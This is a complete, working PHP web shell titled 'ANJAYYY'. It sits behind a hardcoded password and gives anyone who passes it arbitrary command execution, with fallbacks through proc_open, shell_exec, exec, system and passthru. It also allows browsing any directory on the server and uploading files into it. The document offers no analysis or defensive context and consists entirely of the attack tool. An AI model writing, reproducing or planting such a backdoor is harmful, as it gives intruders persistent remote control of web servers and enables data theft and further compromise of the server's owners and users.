<?php
session_start();
header("Content-Type: text/html; charset=UTF-8");

$valid_password = "kontolodon";
if (isset($_POST['password'])) {
    if ($_POST['password'] === $valid_password) {
        $_SESSION['authenticated'] = true;
    }
}

if (!isset($_SESSION['authenticated'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body { background-color: black; color: lime; font-family: monospace; padding: 20px; }
            .login-box { background-color: #222; padding: 20px; border-radius: 5px; border: 1px solid lime; }
            input { background: black; color: lime; border: none; font-family: monospace; width: 100%; outline: none; padding: 5px; }
        </style>
    </head>
    <body>
        <h2>Enter Password</h2>
        <div class="login-box">
            <form method="post">
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

function execute_command($cmd) {
    $output = "";
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
        }
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output_arr);
        $output = implode("\n", $output_arr);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } else {
        $output = "Command execution not supported on this server.";
    }
    return $output;
}

$current_path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!is_dir($current_path)) {
    $current_path = getcwd();
}
chdir($current_path);

$upload_message = "";
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $current_path . DIRECTORY_SEPARATOR . $_FILES['file']['name'])) {
        $upload_message = "File uploaded successfully.";
    } else {
        $upload_message = "File upload failed.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANJAYYY</title>
    <style>
        body { background-color: black; color: lime; font-family: monospace; padding: 20px; }
        .command-input, .output, .file-upload { background-color: #222; padding: 10px; border-radius: 5px; border: 1px solid lime; margin-top: 10px; }
        input { background: black; color: lime; border: none; font-family: monospace; width: 100%; outline: none; padding: 5px; }
    </style>
</head>
<body>
    <h2>Uploader</h2>
    <div class="file-upload">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>
        <p><?php echo $upload_message; ?></p>
    </div>
    <h2>Command Execution</h2>
    <div class="command-input">
        <form method="post">
            <label>$ </label>
            <input type="text" name="cmd" autofocus>
            <input type="submit" value="Run">
        </form>
    </div>
    <div class="output">
        <h3>Command Output</h3>
        <pre>
        <?php
        if (!empty($_POST['cmd'])) {
            echo htmlspecialchars($_POST['cmd']) . "\n";
            echo execute_command($_POST['cmd']);
        }
        ?>
        </pre>
    </div>
</body>
</html>
